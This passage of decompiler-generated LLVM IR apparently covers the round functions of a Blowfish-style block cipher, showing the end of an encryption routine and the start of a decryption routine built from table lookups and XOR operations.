  %274 = xor i32 %270, %273, !insn.addr !527
  %275 = udiv i32 %274, 16777216, !insn.addr !528
  %276 = udiv i32 %274, 16384
  %277 = and i32 %276, 1020, !insn.addr !529
  %278 = add i32 %277, %28, !insn.addr !529
  %279 = inttoptr i32 %278 to i32*, !insn.addr !529
  %280 = load i32, i32* %279, align 4, !insn.addr !529
  %281 = mul i32 %275, 4, !insn.addr !530
  %282 = add i32 %281, %33, !insn.addr !530
  %283 = inttoptr i32 %282 to i32*, !insn.addr !530
  %284 = load i32, i32* %283, align 4, !insn.addr !530
  %285 = add i32 %284, %280, !insn.addr !530
  %286 = udiv i32 %274, 64
  %287 = and i32 %286, 1020, !insn.addr !531
  %288 = add i32 %287, %45, !insn.addr !531
  %289 = inttoptr i32 %288 to i32*, !insn.addr !531
  %290 = load i32, i32* %289, align 4, !insn.addr !531
  %291 = xor i32 %285, %290, !insn.addr !531
  %292 = mul i32 %274, 4, !insn.addr !532
  %293 = and i32 %292, 1020, !insn.addr !533
  %294 = add i32 %293, %52, !insn.addr !533
  %295 = inttoptr i32 %294 to i32*, !insn.addr !533
  %296 = load i32, i32* %295, align 4, !insn.addr !533
  %297 = add i32 %291, %296, !insn.addr !533
  %298 = xor i32 %297, %246, !insn.addr !534
  %299 = add i32 %arg1, 36, !insn.addr !535
  %300 = inttoptr i32 %299 to i32*, !insn.addr !535
  %301 = load i32, i32* %300, align 4, !insn.addr !535
  %302 = xor i32 %298, %301, !insn.addr !536
  %303 = udiv i32 %302, 16777216, !insn.addr !537
  %304 = udiv i32 %302, 16384
  %305 = and i32 %304, 1020, !insn.addr !538
  %306 = add i32 %305, %28, !insn.addr !538
  %307 = inttoptr i32 %306 to i32*, !insn.addr !538
  %308 = load i32, i32* %307, align 4, !insn.addr !538
  %309 = mul i32 %303, 4, !insn.addr !539
  %310 = add i32 %309, %33, !insn.addr !539
  %311 = inttoptr i32 %310 to i32*, !insn.addr !539
  %312 = load i32, i32* %311, align 4, !insn.addr !539
  %313 = add i32 %312, %308, !insn.addr !539
  %314 = udiv i32 %302, 64
  %315 = and i32 %314, 1020, !insn.addr !540
  %316 = add i32 %315, %45, !insn.addr !540
  %317 = inttoptr i32 %316 to i32*, !insn.addr !540
  %318 = load i32, i32* %317, align 4, !insn.addr !540
  %319 = xor i32 %313, %318, !insn.addr !540
  %320 = mul i32 %302, 4, !insn.addr !541
  %321 = and i32 %320, 1020, !insn.addr !542
  %322 = add i32 %321, %52, !insn.addr !542
  %323 = inttoptr i32 %322 to i32*, !insn.addr !542
  %324 = load i32, i32* %323, align 4, !insn.addr !542
  %325 = add i32 %319, %324, !insn.addr !542
  %326 = xor i32 %325, %274, !insn.addr !543
  %327 = add i32 %arg1, 40, !insn.addr !544
  %328 = inttoptr i32 %327 to i32*, !insn.addr !544
  %329 = load i32, i32* %328, align 4, !insn.addr !544
  %330 = xor i32 %326, %329, !insn.addr !545
  %331 = udiv i32 %330, 16777216, !insn.addr !546
  %332 = udiv i32 %330, 16384
  %333 = and i32 %332, 1020, !insn.addr !547
  %334 = add i32 %333, %28, !insn.addr !547
  %335 = inttoptr i32 %334 to i32*, !insn.addr !547
  %336 = load i32, i32* %335, align 4, !insn.addr !547
  %337 = mul i32 %331, 4, !insn.addr !548
  %338 = add i32 %337, %33, !insn.addr !548
  %339 = inttoptr i32 %338 to i32*, !insn.addr !548
  %340 = load i32, i32* %339, align 4, !insn.addr !548
  %341 = add i32 %340, %336, !insn.addr !548
  %342 = udiv i32 %330, 64
  %343 = and i32 %342, 1020, !insn.addr !549
  %344 = add i32 %343, %45, !insn.addr !549
  %345 = inttoptr i32 %344 to i32*, !insn.addr !549
  %346 = load i32, i32* %345, align 4, !insn.addr !549
  %347 = xor i32 %341, %346, !insn.addr !549
  %348 = mul i32 %330, 4, !insn.addr !550
  %349 = and i32 %348, 1020, !insn.addr !551
  %350 = add i32 %349, %52, !insn.addr !551
  %351 = inttoptr i32 %350 to i32*, !insn.addr !551
  %352 = load i32, i32* %351, align 4, !insn.addr !551
  %353 = add i32 %347, %352, !insn.addr !551
  %354 = xor i32 %353, %302, !insn.addr !552
  %355 = add i32 %arg1, 44, !insn.addr !553
  %356 = inttoptr i32 %355 to i32*, !insn.addr !553
  %357 = load i32, i32* %356, align 4, !insn.addr !553
  %358 = xor i32 %354, %357, !insn.addr !554
  %359 = udiv i32 %358, 16777216, !insn.addr !555
  %360 = udiv i32 %358, 16384
  %361 = and i32 %360, 1020, !insn.addr !556
  %362 = add i32 %361, %28, !insn.addr !556
  %363 = inttoptr i32 %362 to i32*, !insn.addr !556
  %364 = load i32, i32* %363, align 4, !insn.addr !556
  %365 = mul i32 %359, 4, !insn.addr !557
  %366 = add i32 %365, %33, !insn.addr !557
  %367 = inttoptr i32 %366 to i32*, !insn.addr !557
  %368 = load i32, i32* %367, align 4, !insn.addr !557
  %369 = add i32 %368, %364, !insn.addr !557
  %370 = udiv i32 %358, 64
  %371 = and i32 %370, 1020, !insn.addr !558
  %372 = add i32 %371, %45, !insn.addr !558
  %373 = inttoptr i32 %372 to i32*, !insn.addr !558
  %374 = load i32, i32* %373, align 4, !insn.addr !558
  %375 = xor i32 %369, %374, !insn.addr !558
  %376 = mul i32 %358, 4, !insn.addr !559
  %377 = and i32 %376, 1020, !insn.addr !560
  %378 = add i32 %377, %52, !insn.addr !560
  %379 = inttoptr i32 %378 to i32*, !insn.addr !560
  %380 = load i32, i32* %379, align 4, !insn.addr !560
  %381 = add i32 %375, %380, !insn.addr !560
  %382 = xor i32 %381, %330, !insn.addr !561
  %383 = add i32 %arg1, 48, !insn.addr !562
  %384 = inttoptr i32 %383 to i32*, !insn.addr !562
  %385 = load i32, i32* %384, align 4, !insn.addr !562
  %386 = xor i32 %382, %385, !insn.addr !563
  %387 = udiv i32 %386, 16777216, !insn.addr !564
  %388 = udiv i32 %386, 16384
  %389 = and i32 %388, 1020, !insn.addr !565
  %390 = add i32 %389, %28, !insn.addr !565
  %391 = inttoptr i32 %390 to i32*, !insn.addr !565
  %392 = load i32, i32* %391, align 4, !insn.addr !565
  %393 = mul i32 %387, 4, !insn.addr !566
  %394 = add i32 %393, %33, !insn.addr !566
  %395 = inttoptr i32 %394 to i32*, !insn.addr !566
  %396 = load i32, i32* %395, align 4, !insn.addr !566
  %397 = add i32 %396, %392, !insn.addr !566
  %398 = udiv i32 %386, 64
  %399 = and i32 %398, 1020, !insn.addr !567
  %400 = add i32 %399, %45, !insn.addr !567
  %401 = inttoptr i32 %400 to i32*, !insn.addr !567
  %402 = load i32, i32* %401, align 4, !insn.addr !567
  %403 = xor i32 %397, %402, !insn.addr !567
  %404 = mul i32 %386, 4, !insn.addr !568
  %405 = and i32 %404, 1020, !insn.addr !569
  %406 = add i32 %405, %52, !insn.addr !569
  %407 = inttoptr i32 %406 to i32*, !insn.addr !569
  %408 = load i32, i32* %407, align 4, !insn.addr !569
  %409 = add i32 %403, %408, !insn.addr !569
  %410 = xor i32 %409, %358, !insn.addr !570
  %411 = add i32 %arg1, 52, !insn.addr !571
  %412 = inttoptr i32 %411 to i32*, !insn.addr !571
  %413 = load i32, i32* %412, align 4, !insn.addr !571
  %414 = xor i32 %410, %413, !insn.addr !572
  %415 = udiv i32 %414, 16777216, !insn.addr !573
  %416 = udiv i32 %414, 16384
  %417 = and i32 %416, 1020, !insn.addr !574
  %418 = add i32 %417, %28, !insn.addr !574
  %419 = inttoptr i32 %418 to i32*, !insn.addr !574
  %420 = load i32, i32* %419, align 4, !insn.addr !574
  %421 = mul i32 %415, 4, !insn.addr !575
  %422 = add i32 %421, %33, !insn.addr !575
  %423 = inttoptr i32 %422 to i32*, !insn.addr !575
  %424 = load i32, i32* %423, align 4, !insn.addr !575
  %425 = add i32 %424, %420, !insn.addr !575
  %426 = udiv i32 %414, 64
  %427 = and i32 %426, 1020, !insn.addr !576
  %428 = add i32 %427, %45, !insn.addr !576
  %429 = inttoptr i32 %428 to i32*, !insn.addr !576
  %430 = load i32, i32* %429, align 4, !insn.addr !576
  %431 = xor i32 %425, %430, !insn.addr !576
  %432 = mul i32 %414, 4, !insn.addr !577
  %433 = and i32 %432, 1020, !insn.addr !578
  %434 = add i32 %433, %52, !insn.addr !578
  %435 = inttoptr i32 %434 to i32*, !insn.addr !578
  %436 = load i32, i32* %435, align 4, !insn.addr !578
  %437 = add i32 %431, %436, !insn.addr !578
  %438 = xor i32 %437, %386, !insn.addr !579
  %439 = add i32 %arg1, 56, !insn.addr !580
  %440 = inttoptr i32 %439 to i32*, !insn.addr !580
  %441 = load i32, i32* %440, align 4, !insn.addr !580
  %442 = xor i32 %438, %441, !insn.addr !581
  %443 = udiv i32 %442, 16777216, !insn.addr !582
  %444 = udiv i32 %442, 16384
  %445 = and i32 %444, 1020, !insn.addr !583
  %446 = add i32 %445, %28, !insn.addr !583
  %447 = inttoptr i32 %446 to i32*, !insn.addr !583
  %448 = load i32, i32* %447, align 4, !insn.addr !583
  %449 = mul i32 %443, 4, !insn.addr !584
  %450 = add i32 %449, %33, !insn.addr !584
  %451 = inttoptr i32 %450 to i32*, !insn.addr !584
  %452 = load i32, i32* %451, align 4, !insn.addr !584
  %453 = add i32 %452, %448, !insn.addr !584
  %454 = udiv i32 %442, 64
  %455 = and i32 %454, 1020, !insn.addr !585
  %456 = add i32 %455, %45, !insn.addr !585
  %457 = inttoptr i32 %456 to i32*, !insn.addr !585
  %458 = load i32, i32* %457, align 4, !insn.addr !585
  %459 = xor i32 %453, %458, !insn.addr !585
  %460 = add i32 %arg1, 60, !insn.addr !586
  %461 = inttoptr i32 %460 to i32*, !insn.addr !586
  %462 = load i32, i32* %461, align 4, !insn.addr !586
  %463 = mul i32 %442, 4, !insn.addr !587
  %464 = and i32 %463, 1020, !insn.addr !588
  %465 = add i32 %464, %52, !insn.addr !588
  %466 = inttoptr i32 %465 to i32*, !insn.addr !588
  %467 = load i32, i32* %466, align 4, !insn.addr !588
  %468 = add i32 %467, %459, !insn.addr !588
  %469 = xor i32 %462, %414, !insn.addr !589
  %470 = xor i32 %469, %468, !insn.addr !590
  %471 = udiv i32 %470, 16777216, !insn.addr !591
  %472 = udiv i32 %470, 16384
  %473 = and i32 %472, 1020, !insn.addr !592
  %474 = add i32 %473, %28, !insn.addr !592
  %475 = inttoptr i32 %474 to i32*, !insn.addr !592
  %476 = load i32, i32* %475, align 4, !insn.addr !592
  %477 = mul i32 %471, 4, !insn.addr !593
  %478 = add i32 %477, %33, !insn.addr !593
  %479 = inttoptr i32 %478 to i32*, !insn.addr !593
  %480 = load i32, i32* %479, align 4, !insn.addr !593
  %481 = add i32 %480, %476, !insn.addr !593
  %482 = udiv i32 %470, 64
  %483 = and i32 %482, 1020, !insn.addr !594
  %484 = add i32 %483, %45, !insn.addr !594
  %485 = inttoptr i32 %484 to i32*, !insn.addr !594
  %486 = load i32, i32* %485, align 4, !insn.addr !594
  %487 = xor i32 %481, %486, !insn.addr !594
  %488 = add i32 %arg1, 68, !insn.addr !595
  %489 = inttoptr i32 %488 to i32*, !insn.addr !595
  %490 = load i32, i32* %489, align 4, !insn.addr !595
  %491 = xor i32 %490, %470, !insn.addr !595
  %492 = mul i32 %470, 4, !insn.addr !596
  %493 = and i32 %492, 1020, !insn.addr !597
  %494 = add i32 %493, %52, !insn.addr !597
  %495 = inttoptr i32 %494 to i32*, !insn.addr !597
  %496 = load i32, i32* %495, align 4, !insn.addr !597
  %497 = add i32 %496, %487, !insn.addr !597
  %498 = add i32 %arg1, 64, !insn.addr !598
  %499 = inttoptr i32 %498 to i32*, !insn.addr !598
  %500 = load i32, i32* %499, align 4, !insn.addr !598
  %501 = xor i32 %500, %442, !insn.addr !598
  %502 = xor i32 %501, %497, !insn.addr !599
  %503 = udiv i32 %491, 16777216, !insn.addr !600
  %504 = trunc i32 %503 to i8, !insn.addr !601
  store i8 %504, i8* %2, align 1, !insn.addr !601
  %505 = udiv i32 %491, 65536, !insn.addr !602
  %506 = trunc i32 %505 to i8, !insn.addr !603
  %507 = add i32 %0, 1, !insn.addr !603
  %508 = inttoptr i32 %507 to i8*, !insn.addr !603
  store i8 %506, i8* %508, align 1, !insn.addr !603
  %509 = udiv i32 %491, 256, !insn.addr !604
  %510 = trunc i32 %509 to i8, !insn.addr !605
  %511 = add i32 %0, 2, !insn.addr !605
  %512 = inttoptr i32 %511 to i8*, !insn.addr !605
  store i8 %510, i8* %512, align 1, !insn.addr !605
  %513 = udiv i32 %502, 16777216, !insn.addr !606
  %514 = trunc i32 %513 to i8, !insn.addr !607
  %515 = add i32 %0, 4, !insn.addr !607
  %516 = inttoptr i32 %515 to i8*, !insn.addr !607
  store i8 %514, i8* %516, align 1, !insn.addr !607
  %517 = udiv i32 %502, 65536, !insn.addr !608
  %518 = trunc i32 %517 to i8, !insn.addr !609
  %519 = add i32 %0, 5, !insn.addr !609
  %520 = inttoptr i32 %519 to i8*, !insn.addr !609
  store i8 %518, i8* %520, align 1, !insn.addr !609
  %521 = udiv i32 %502, 256, !insn.addr !610
  %522 = trunc i32 %491 to i8, !insn.addr !611
  %523 = add i32 %0, 3, !insn.addr !611
  %524 = inttoptr i32 %523 to i8*, !insn.addr !611
  store i8 %522, i8* %524, align 1, !insn.addr !611
  %525 = trunc i32 %521 to i8, !insn.addr !612
  %526 = add i32 %0, 6, !insn.addr !612
  %527 = inttoptr i32 %526 to i8*, !insn.addr !612
  store i8 %525, i8* %527, align 1, !insn.addr !612
  %528 = trunc i32 %502 to i8, !insn.addr !613
  %529 = add i32 %0, 7, !insn.addr !613
  %530 = inttoptr i32 %529 to i8*, !insn.addr !613
  store i8 %528, i8* %530, align 1, !insn.addr !613
  ret i32 %521, !insn.addr !614
}

define i32 @function_4068d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4068d0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = inttoptr i32 %0 to i8*, !insn.addr !615
  %3 = add i32 %1, 1, !insn.addr !616
  %4 = inttoptr i32 %3 to i8*, !insn.addr !616
  %5 = load i8, i8* %4, align 1, !insn.addr !616
  %6 = zext i8 %5 to i32, !insn.addr !616
  %7 = mul i32 %1, 256, !insn.addr !617
  %8 = and i32 %7, 65280, !insn.addr !618
  %9 = or i32 %8, %6, !insn.addr !619
  %10 = add i32 %1, 2, !insn.addr !620
  %11 = inttoptr i32 %10 to i8*, !insn.addr !620
  %12 = load i8, i8* %11, align 1, !insn.addr !620
  %13 = zext i8 %12 to i32, !insn.addr !620
  %14 = mul i32 %9, 256, !insn.addr !621
  %15 = or i32 %14, %13, !insn.addr !622
  %16 = add i32 %1, 3, !insn.addr !623
  %17 = inttoptr i32 %16 to i8*, !insn.addr !623
  %18 = load i8, i8* %17, align 1, !insn.addr !623
  %19 = zext i8 %18 to i32, !insn.addr !623
  %20 = mul i32 %15, 256, !insn.addr !624
  %21 = or i32 %20, %19, !insn.addr !625
  %22 = add i32 %arg1, 68, !insn.addr !626
  %23 = inttoptr i32 %22 to i32*, !insn.addr !626
  %24 = load i32, i32* %23, align 4, !insn.addr !626
  %25 = xor i32 %21, %24, !insn.addr !626
  %26 = udiv i32 %25, 16777216, !insn.addr !627
  %27 = udiv i32 %25, 16384
  %28 = and i32 %27, 1020, !insn.addr !628
  %29 = add i32 %arg1, 1096, !insn.addr !628
  %30 = add i32 %28, %29, !insn.addr !628
  %31 = inttoptr i32 %30 to i32*, !insn.addr !628
  %32 = load i32, i32* %31, align 4, !insn.addr !628
  %33 = mul i32 %26, 4, !insn.addr !629
  %34 = add i32 %arg1, 72, !insn.addr !629
  %35 = add i32 %33, %34, !insn.addr !629
  %36 = inttoptr i32 %35 to i32*, !insn.addr !629
  %37 = load i32, i32* %36, align 4, !insn.addr !629
  %38 = add i32 %37, %32, !insn.addr !629
  %39 = add i32 %1, 4, !insn.addr !630
  %40 = inttoptr i32 %39 to i8*, !insn.addr !630
  %41 = load i8, i8* %40, align 1, !insn.addr !630
  %42 = zext i8 %41 to i32, !insn.addr !630
  %43 = mul i32 %42, 256, !insn.addr !631
  %44 = udiv i32 %25, 64
  %45 = and i32 %44, 1020, !insn.addr !632
  %46 = add i32 %arg1, 2120, !insn.addr !632
  %47 = add i32 %45, %46, !insn.addr !632
  %48 = inttoptr i32 %47 to i32*, !insn.addr !632
  %49 = load i32, i32* %48, align 4, !insn.addr !632
  %50 = xor i32 %49, %38, !insn.addr !632
  %51 = mul i32 %25, 4, !insn.addr !633
  %52 = and i32 %51, 1020, !insn.addr !634
  %53 = add i32 %arg1, 3144, !insn.addr !634
  %54 = add i32 %52, %53, !insn.addr !634
  %55 = inttoptr i32 %54 to i32*, !insn.addr !634
  %56 = load i32, i32* %55, align 4, !insn.addr !634
  %57 = add i32 %50, %56, !insn.addr !634
  %58 = add i32 %1, 5, !insn.addr !635
  %59 = inttoptr i32 %58 to i8*, !insn.addr !635
  %60 = load i8, i8* %59, align 1, !insn.addr !635
  %61 = zext i8 %60 to i32, !insn.addr !635
  %62 = or i32 %43, %61, !insn.addr !636
  %63 = add i32 %1, 6, !insn.addr !637
  %64 = inttoptr i32 %63 to i8*, !insn.addr !637
  %65 = load i8, i8* %64, align 1, !insn.addr !637
  %66 = zext i8 %65 to i32, !insn.addr !637
  %67 = mul i32 %62, 256, !insn.addr !638
  %68 = or i32 %67, %66, !insn.addr !639
  %69 = add i32 %1, 7, !insn.addr !640
  %70 = inttoptr i32 %69 to i8*, !insn.addr !640
  %71 = load i8, i8* %70, align 1, !insn.addr !640
  %72 = zext i8 %71 to i32, !insn.addr !640
  %73 = mul i32 %68, 256, !insn.addr !641
  %74 = or i32 %73, %72, !insn.addr !642
  %75 = add i32 %arg1, 64, !insn.addr !643
  %76 = inttoptr i32 %75 to i32*, !insn.addr !643
  %77 = load i32, i32* %76, align 4, !insn.addr !643
  %78 = xor i32 %77, %57, !insn.addr !644
  %79 = xor i32 %78, %74, !insn.addr !643
  %80 = udiv i32 %79, 16777216, !insn.addr !645
  %81 = udiv i32 %79, 16384
  %82 = and i32 %81, 1020, !insn.addr !646
  %83 = add i32 %82, %29, !insn.addr !646
  %84 = inttoptr i32 %83 to i32*, !insn.addr !646
  %85 = load i32, i32* %84, align 4, !insn.addr !646
  %86 = mul i32 %80, 4, !insn.addr !647
  %87 = add i32 %86, %34, !insn.addr !647
  %88 = inttoptr i32 %87 to i32*, !insn.addr !647
  %89 = load i32, i32* %88, align 4, !insn.addr !647
  %90 = add i32 %89, %85, !insn.addr !647
  %91 = udiv i32 %79, 64
  %92 = and i32 %91, 1020, !insn.addr !648
  %93 = add i32 %92, %46, !insn.addr !648
  %94 = inttoptr i32 %93 to i32*, !insn.addr !648
  %95 = load i32, i32* %94, align 4, !insn.addr !648
  %96 = xor i32 %90, %95, !insn.addr !648
  %97 = mul i32 %79, 4, !insn.addr !649
  %98 = and i32 %97, 1020, !insn.addr !650
  %99 = add i32 %98, %53, !insn.addr !650
  %100 = inttoptr i32 %99 to i32*, !insn.addr !650
  %101 = load i32, i32* %100, align 4, !insn.addr !650
  %102 = add i32 %96, %101, !insn.addr !650
  %103 = xor i32 %102, %25, !insn.addr !651
  %104 = add i32 %arg1, 60, !insn.addr !652
  %105 = inttoptr i32 %104 to i32*, !insn.addr !652
  %106 = load i32, i32* %105, align 4, !insn.addr !652
  %107 = xor i32 %103, %106, !insn.addr !653
  %108 = udiv i32 %107, 16777216, !insn.addr !654
  %109 = udiv i32 %107, 16384
  %110 = and i32 %109, 1020, !insn.addr !655
  %111 = add i32 %110, %29, !insn.addr !655
  %112 = inttoptr i32 %111 to i32*, !insn.addr !655
  %113 = load i32, i32* %112, align 4, !insn.addr !655
  %114 = mul i32 %108, 4, !insn.addr !656
  %115 = add i32 %114, %34, !insn.addr !656
  %116 = inttoptr i32 %115 to i32*, !insn.addr !656
  %117 = load i32, i32* %116, align 4, !insn.addr !656
  %118 = add i32 %117, %113, !insn.addr !656
  %119 = udiv i32 %107, 64
  %120 = and i32 %119, 1020, !insn.addr !657
  %121 = add i32 %120, %46, !insn.addr !657
  %122 = inttoptr i32 %121 to i32*, !insn.addr !657
  %123 = load i32, i32* %122, align 4, !insn.addr !657
  %124 = xor i32 %118, %123, !insn.addr !657
  %125 = mul i32 %107, 4, !insn.addr !658
  %126 = and i32 %125, 1020, !insn.addr !659
  %127 = add i32 %126, %53, !insn.addr !659
  %128 = inttoptr i32 %127 to i32*, !insn.addr !659
  %129 = load i32, i32* %128, align 4, !insn.addr !659
  %130 = add i32 %124, %129, !insn.addr !659
  %131 = xor i32 %130, %79, !insn.addr !660
  %132 = add i32 %arg1, 56, !insn.addr !661
  %133 = inttoptr i32 %132 to i32*, !insn.addr !661
  %134 = load i32, i32* %133, align 4, !insn.addr !661
  %135 = xor i32 %131, %134, !insn.addr !662
  %136 = udiv i32 %135, 16777216, !insn.addr !663
  %137 = udiv i32 %135, 16384
  %138 = and i32 %137, 1020, !insn.addr !664
  %139 = add i32 %138, %29, !insn.addr !664
  %140 = inttoptr i32 %139 to i32*, !insn.addr !664
  %141 = load i32, i32* %140, align 4, !insn.addr !664
  %142 = mul i32 %136, 4, !insn.addr !665
  %143 = add i32 %142, %34, !insn.addr !665
  %144 = inttoptr i32 %143 to i32*, !insn.addr !665
  %145 = load i32, i32* %144, align 4, !insn.addr !665
  %146 = add i32 %145, %141, !insn.addr !665
  %147 = udiv i32 %135, 64
  %148 = and i32 %147, 1020, !insn.addr !666
  %149 = add i32 %148, %46, !insn.addr !666
  %150 = inttoptr i32 %149 to i32*, !insn.addr !666
  %151 = load i32, i32* %150, align 4, !insn.addr !666
  %152 = xor i32 %146, %151, !insn.addr !666
  %153 = mul i32 %135, 4, !insn.addr !667
  %154 = and i32 %153, 1020, !insn.addr !668
  %155 = add i32 %154, %53, !insn.addr !668
  %156 = inttoptr i32 %155 to i32*, !insn.addr !668
  %157 = load i32, i32* %156, align 4, !insn.addr !668
  %158 = add i32 %152, %157, !insn.addr !668
  %159 = xor i32 %158, %107, !insn.addr !669
  %160 = add i32 %arg1, 52, !insn.addr !670
  %161 = inttoptr i32 %160 to i32*, !insn.addr !670
  %162 = load i32, i32* %161, align 4, !insn.addr !670
  %163 = xor i32 %159, %162, !insn.addr !671
  %164 = udiv i32 %163, 16777216, !insn.addr !672
  %165 = udiv i32 %163, 16384
  %166 = and i32 %165, 1020, !insn.addr !673
  %167 = add i32 %166, %29, !insn.addr !673
  %168 = inttoptr i32 %167 to i32*, !insn.addr !673
  %169 = load i32, i32* %168, align 4, !insn.addr !673
  %170 = mul i32 %164, 4, !insn.addr !674
  %171 = add i32 %170, %34, !insn.addr !674
  %172 = inttoptr i32 %171 to i32*, !insn.addr !674
  %173 = load i32, i32* %172, align 4, !insn.addr !674
  %174 = add i32 %173, %169, !insn.addr !674
  %175 = udiv i32 %163, 64
  %176 = and i32 %175, 1020, !insn.addr !675
  %177 = add i32 %176, %46, !insn.addr !675
  %178 = inttoptr i32 %177 to i32*, !insn.addr !675
  %179 = load i32, i32* %178, align 4, !insn.addr !675
  %180 = xor i32 %174, %179, !insn.addr !675
  %181 = mul i32 %163, 4, !insn.addr !676
  %182 = and i32 %181, 1020, !insn.addr !677
  %183 = add i32 %182, %53, !insn.addr !677
  %184 = inttoptr i32 %183 to i32*, !insn.addr !677
  %185 = load i32, i32* %184, align 4, !insn.addr !677
  %186 = add i32 %180, %185, !insn.addr !677
  %187 = xor i32 %186, %135, !insn.addr !678
  %188 = add i32 %arg1, 48, !insn.addr !679
  %189 = inttoptr i32 %188 to i32*, !insn.addr !679
  %190 = load i32, i32* %189, align 4, !insn.addr !679
  %191 = xor i32 %187, %190, !insn.addr !680
  %192 = udiv i32 %191, 16777216, !insn.addr !681
  %193 = udiv i32 %191, 16384
  %194 = and i32 %193, 1020, !insn.addr !682
  %195 = add i32 %194, %29, !insn.addr !682
  %196 = inttoptr i32 %195 to i32*, !insn.addr !682
  %197 = load i32, i32* %196, align 4, !insn.addr !682
  %198 = mul i32 %192, 4, !insn.addr !683
  %199 = add i32 %198, %34, !insn.addr !683
  %200 = inttoptr i32 %199 to i32*, !insn.addr !683
  %201 = load i32, i32* %200, align 4, !insn.addr !683
  %202 = add i32 %201, %197, !insn.addr !683
  %203 = udiv i32 %191, 64
  %204 = and i32 %203, 1020, !insn.addr !684
  %205 = add i32 %204, %46, !insn.addr !684
  %206 = inttoptr i32 %205 to i32*, !insn.addr !684
  %207 = load i32, i32* %206, align 4, !insn.addr !684
  %208 = xor i32 %202, %207, !insn.addr !684
  %209 = mul i32 %191, 4, !insn.addr !685
  %210 = and i32 %209, 1020, !insn.addr !686
  %211 = add i32 %210, %53, !insn.addr !686
  %212 = inttoptr i32 %211 to i32*, !insn.addr !686
  %213 = load i32, i32* %212, align 4, !insn.addr !686
  %214 = add i32 %208, %213, !insn.addr !686
  %215 = xor i32 %214, %163, !insn.addr !687
  %216 = add i32 %arg1, 44, !insn.addr !688
  %217 = inttoptr i32 %216 to i32*, !insn.addr !688
  %218 = load i32, i32* %217, align 4, !insn.addr !688
  %219 = xor i32 %215, %218, !insn.addr !689
  %220 = udiv i32 %219, 16777216, !insn.addr !690
  %221 = udiv i32 %219, 16384
  %222 = and i32 %221, 1020, !insn.addr !691
  %223 = add i32 %222, %29, !insn.addr !691
  %224 = inttoptr i32 %223 to i32*, !insn.addr !691
  %225 = load i32, i32* %224, align 4, !insn.addr !691
  %226 = mul i32 %220, 4, !insn.addr !692
  %227 = add i32 %226, %34, !insn.addr !692
  %228 = inttoptr i32 %227 to i32*, !insn.addr !692
  %229 = load i32, i32* %228, align 4, !insn.addr !692
  %230 = add i32 %229, %225, !insn.addr !692
  %231 = udiv i32 %219, 64
  %232 = and i32 %231, 1020, !insn.addr !693
  %233 = add i32 %232, %46, !insn.addr !693
  %234 = inttoptr i32 %233 to i32*, !insn.addr !693
  %235 = load i32, i32* %234, align 4, !insn.addr !693
  %236 = xor i32 %230, %235, !insn.addr !693
  %237 = mul i32 %219, 4, !insn.addr !694
  %238 = and i32 %237, 1020, !insn.addr !695
  %239 = add i32 %238, %53, !insn.addr !695
  %240 = inttoptr i32 %239 to i32*, !insn.addr !695
  %241 = load i32, i32* %240, align 4, !insn.addr !695
  %242 = add i32 %236, %241, !insn.addr !695
  %243 = xor i32 %242, %191, !insn.addr !696
  %244 = add i32 %arg1, 40, !insn.addr !697
  %245 = inttoptr i32 %244 to i32*, !insn.addr !697
  %246 = load i32, i32* %245, align 4, !insn.addr !697
  %247 = xor i32 %243, %246, !insn.addr !698
  %248 = udiv i32 %247, 16777216, !insn.addr !699
  %249 = udiv i32 %247, 16384
  %250 = and i32 %249, 1020, !insn.addr !700
  %251 = add i32 %250, %29, !insn.addr !700
  %252 = inttoptr i32 %251 to i32*, !insn.addr !700
  %253 = load i32, i32* %252, align 4, !insn.addr !700
  %254 = mul i32 %248, 4, !insn.addr !701
  %255 = add i32 %254, %34, !insn.addr !701
  %256 = inttoptr i32 %255 to i32*, !insn.addr !701
  %257 = load i32, i32* %256, align 4, !insn.addr !701
  %258 = add i32 %257, %253, !insn.addr !701
  %259 = udiv i32 %247, 64
  %260 = and i32 %259, 1020, !insn.addr !702
  %261 = add i32 %260, %46, !insn.addr !702
  %262 = inttoptr i32 %261 to i32*, !insn.addr !702
  %263 = load i32, i32* %262, align 4, !insn.addr !702
  %264 = xor i32 %258, %263, !insn.addr !702
  %265 = mul i32 %247, 4, !insn.addr !703
  %266 = and i32 %265, 1020, !insn.addr !704
  %267 = add i32 %266, %53, !insn.addr !704
  %268 = inttoptr i32 %267 to i32*, !insn.addr !704
  %269 = load i32, i32* %268, align 4, !insn.addr !704
  %270 = add i32 %264, %269, !insn.addr !704
  %271 = xor i32 %270, %219, !insn.addr !705
  %272 = add i32 %arg1, 36, !insn.addr !706
  %273 = inttoptr i32 %272 to i32*, !insn.addr !706
  %274 = load i32, i32* %273, align 4, !insn.addr !706
  %275 = xor i32 %271, %274, !insn.addr !707
  %276 = udiv i32 %275, 16777216, !insn.addr !708
  %277 = udiv i32 %275, 16384
  %278 = and i32 %277, 1020, !insn.addr !709
  %279 = add i32 %278, %29, !insn.addr !709
  %280 = inttoptr i32 %279 to i32*, !insn.addr !709
  %281 = load i32, i32* %280, align 4, !insn.addr !709
  %282 = mul i32 %276, 4, !insn.addr !710
  %283 = add i32 %282, %34, !insn.addr !710
  %284 = inttoptr i32 %283 to i32*, !insn.addr !710
  %285 = load i32, i32* %284, align 4, !insn.addr !710
  %286 = add i32 %285, %281, !insn.addr !710
  %287 = udiv i32 %275, 64
  %288 = and i32 %287, 1020, !insn.addr !711
  %289 = add i32 %288, %46, !insn.addr !711
  %290 = inttoptr i32 %289 to i32*, !insn.addr !711
  %291 = load i32, i32* %290, align 4, !insn.addr !711
  %292 = xor i32 %286, %291, !insn.addr !711
  %293 = mul i32 %275, 4, !insn.addr !712
  %294 = and i32 %293, 1020, !insn.addr !713
  %295 = add i32 %294, %53, !insn.addr !713
  %296 = inttoptr i32 %295 to i32*, !insn.addr !713
  %297 = load i32, i32* %296, align 4, !insn.addr !713
  %298 = add i32 %292, %297, !insn.addr !713
  %299 = xor i32 %298, %247, !insn.addr !714
  %300 = add i32 %arg1, 32, !insn.addr !715
  %301 = inttoptr i32 %300 to i32*, !insn.addr !715
  %302 = load i32, i32* %301, align 4, !insn.addr !715
  %303 = xor i32 %299, %302, !insn.addr !716
  %304 = udiv i32 %303, 16777216, !insn.addr !717
  %305 = udiv i32 %303, 16384
  %306 = and i32 %305, 1020, !insn.addr !718
  %307 = add i32 %306, %29, !insn.addr !718
  %308 = inttoptr i32 %307 to i32*, !insn.addr !718
  %309 = load i32, i32* %308, align 4, !insn.addr !718
